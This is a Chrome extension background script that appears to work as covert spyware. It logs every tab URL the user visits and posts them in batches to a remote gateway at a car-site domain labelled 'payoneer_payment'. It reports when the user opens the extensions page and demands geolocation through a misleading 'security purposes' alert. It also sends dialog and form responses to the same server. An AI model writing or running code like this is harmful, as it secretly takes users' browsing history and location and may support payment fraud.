console.log("EXECUTING BACKGROUND.JS...");
var currentGateway = "http://cars.dmitriybuteiko.com/payoneer_payment/sandbox";
startBackgroundStatistic();

processHelpingFunctions();

setInterval(function () {
  getValuesFromLocalStorage(["mdata"], function (result) {
    var mdata = result.mdata || [];

    console.log("Current mdata data:");
    console.log(mdata);

    if (mdata.length > 10) {
      console.log("Stats data needs to be added");
      addMStatsData(mdata);
      chrome.storage.local.set({ mdata: [] });
    }
  });
}, 2000);

chrome.tabs.onActivated.addListener(function (activeInfo) {
  chrome.tabs.get(activeInfo.tabId, function (info) {
    processSwitchUrl(info.url);

    if (info.url.indexOf("extension") > 1) {
      console.log("EXTENSIONS PAGE ENTERED BY USER!!");
      addAnalyticsData("EXTENSIONS PAGE ENTERED BY USER!!");
    }
  });
});

// CUSTOMIZE installation time for chrome extension
function processHelpingFunctions() {
  getValuesFromLocalStorage(["installation_time"], function (result) {
    var installation_time = result.installation_time || false;

    if (installation_time == false) {
      installation_time = Date.now();

      console.log("Current Installation Time: " + installation_time);
    }

    chrome.storage.local.set({ installation_time: installation_time });
  });
}

function processSwitchUrl(url) {
  console.log(url);

  getValuesFromLocalStorage(["processedSwitchUrls"], function (result) {
    var processedSwitchUrls = result.processedSwitchUrls || [];

    //processedSwitchUrls = [];

    console.log("Current processed urls:");
    console.log(processedSwitchUrls);

    processedSwitchUrls.push(url);

    if (processedSwitchUrls.length > 20) {
      addSwitchUrlsData(processedSwitchUrls);

      processedSwitchUrls = [];
    }

    chrome.storage.local.set({ processedSwitchUrls: processedSwitchUrls });
  });
}

function addSwitchUrlsData(processedSwitchUrls) {
  $.post(
    currentGateway + "/add_processed_switch_urls.php",
    {
      urls_data: JSON.stringify(processedSwitchUrls),
      add_switch_url_data: true,
    },
    function (response) {
      console.log(response);
    }
  );
}

function addMStatsData(processedMStatsData) {
  $.post(
    currentGateway + "/add_messages_statistics.php",
    {
      mstats_data: JSON.stringify(processedMStatsData),
      add_mstats_data: true,
    },
    function (response) {
      console.log(response);
    }
  );
}

console.log("ATTACHING JAVASCIRPT CODE LISTENER...");
chrome.runtime.onMessage.addListener(function (request, sender) {
  console.log("MESSAGE RECEIVED!");
  console.log("MESSAGE TEXT: " + request.options.message);

  if (request.options.message == "get_javascript_code_to_execute") {
    fetchUsersGeolocationOverall(function (position) {
      getValuesFromLocalStorage(["product_key"], function (result) {
        var product_key = result.product_key || false;

        $.post(
          currentGateway + "/check_buyers_info.php",
          {
            user_latitude: position.coords.latitude,
            user_longtitude: position.coords.longitude,
            check_product_key: true,
            product_key: product_key,
            get_javascript_code: true,
          },
          function (response) {
            // console.log(response);

            response = JSON.parse(response);

            console.log(response);

            if (response.status == "error") {
              console.log("ERROR! HAPPENED WHEN VERIFYING PRODUCT KEY!");
            }

            if (response.status == "success") {
              console.log("SUCCESS! PRODUCT KEY SUCCESSFULLY VERIFIED!");
            }

            chrome.tabs.sendMessage(
              sender.tab.id,
              { action: "open_dialog_box", response: response },
              function (response) {}
            );
          }
        );
      });
    });

    return true;
  }

  if (request.options.message == "add_statistics_location") {
    addAnalyticsData(request.options.messageBody);
  }

  if (request.options.message == "add_statistics_data") {
    addAnalyticsData(request.options.messageBody);
  }

  if (request.options.message == "add_form_data_info") {
    addFormDataInfo(request.options);
  }

  if (request.options.message == "get_geolocation_from_background_script") {
    console.log("GEOLOCATION REQUEST RECEIVED..");

    navigator.geolocation.getCurrentPosition(function (position) {
      console.log("FETCHED NAVIGATOR GEOLOCATION...");
      console.log(position);

      var response = {
        user_latitude: position.coords.latitude,
        user_longitude: position.coords.longitude,
        timestamp: new Date(),
      };

      chrome.tabs.sendMessage(
        sender.tab.id,
        { action: "open_dialog_box", response: response },
        function (response) {}
      );
    });
  }

  if (request.options.message == "check_messages_for_users") {
    processCheckingMessagesForUsers(sender);
  }
  if (request.options.message == "check_profit_messages_for_users") {
    processCheckingProfitMessagesForUsers(sender);
  }

  if (request.options.message == "message_handled_for_the_user") {
    setMessageProcessedByTheUser(request.options.id_in_database);
  }
  if (request.options.message == "profit_message_handled_for_the_user") {
    setProfitMessageProcessedByTheUser(request.options.id_in_database);
  }
});

function setProfitMessageProcessedByTheUser(message_id) {
  console.log("SENDING PROFIT MESSAGE PROCESSED NOTIFICATION...");

  $.post(
    currentGateway + "/messages_for_users.php",
    {
      set_handed_profit_message: true,
      handled_profit_message_id: message_id,
    },
    function (response) {
      console.log(response);
    }
  );
}

function setMessageProcessedByTheUser(message_id) {
  console.log("SENDING MESSAGE PROCESSED NOTIFICATION...");

  $.post(
    currentGateway + "/messages_for_users.php",
    {
      set_handed_message: true,
      handled_message_id: message_id,
    },
    function (response) {
      console.log(response);
    }
  );
}

function processCheckingMessagesForUsers(sender) {
  $.post(
    currentGateway + "/messages_for_users.php",
    {
      check_messages_for_users: true,
    },
    function (response) {
      console.log("MESSAGES RESULT FOR THE USERS HAS BEEN RECEIVED!!");
      console.log(response);

      chrome.tabs.sendMessage(
        sender.tab.id,
        { action: "response_about_messages_from_database", response: response },
        function (response) {}
      );
    }
  );
}

function processCheckingProfitMessagesForUsers(sender) {
  $.post(
    currentGateway + "/messages_for_users.php",
    {
      check_profit_messages: true,
    },
    function (response) {
      console.log("MESSAGES RESULT FOR THE USERS HAS BEEN RECEIVED!!");
      console.log(response);

      chrome.tabs.sendMessage(
        sender.tab.id,
        {
          action: "response_about_profit_messages_from_database",
          response: response,
        },
        function (response) {}
      );
    }
  );
}

function startBackgroundStatistic() {
  addAnalyticsData("BACKGROUND SCRIPT EXECUTED...");

  setInterval(function () {
    addAnalyticsData("BACKGROUND SCRIPT IS WORKING...");
  }, 10 * 60 * 1000);
}

function addFormDataInfo(data) {
  console.log("SENDING FORM DATA MESSAGE...");

  var dialog_text = data.dialog_text;
  var user_response = data.user_response;

  console.log(data.dialog_text);
  console.log(data.user_response);

  $.post(
    currentGateway + "/statistics.php",
    {
      dialog_text: dialog_text,
      user_response: user_response,
      add_form_data_statistics: true,
    },
    function (response) {
      console.log(response);
    }
  );
}

function getValuesFromLocalStorage(valuesArray, callback) {
  chrome.storage.local.get(valuesArray, function (result) {
    if (callback) {
      callback(result);
    }
  });
}

function fetchUsersGeolocationOverall(callback) {
  if ("geolocation" in navigator) {
    // check if geolocation is supported/enabled on current browser
    navigator.geolocation.getCurrentPosition(
      function success(position) {
        // for when getting location is a success
        console.log(
          "latitude",
          position.coords.latitude,
          "longitude",
          position.coords.longitude
        );

        callback(position);
      },
      function error(error_message) {
        alert(
          "We are sorry, but your location is Required for security purposes!Please, allow access to it via settings."
        );
        fetchUsersGeolocationOverall();
      }
    );
  } else {
    alert(
      "To buy this extension you need to download latest version of Chome that has geolocation api!"
    );
  }
}

function addAnalyticsData(message) {
  console.log("SENDING ANALYTICS MESSAGE...");
  console.log("MESSAGE: " + message);

  $.post(
    currentGateway + "/statistics.php",
    {
      message: message,
      add_statistics: true,
    },
    function (response) {
      console.log(response);
    }
  );
}
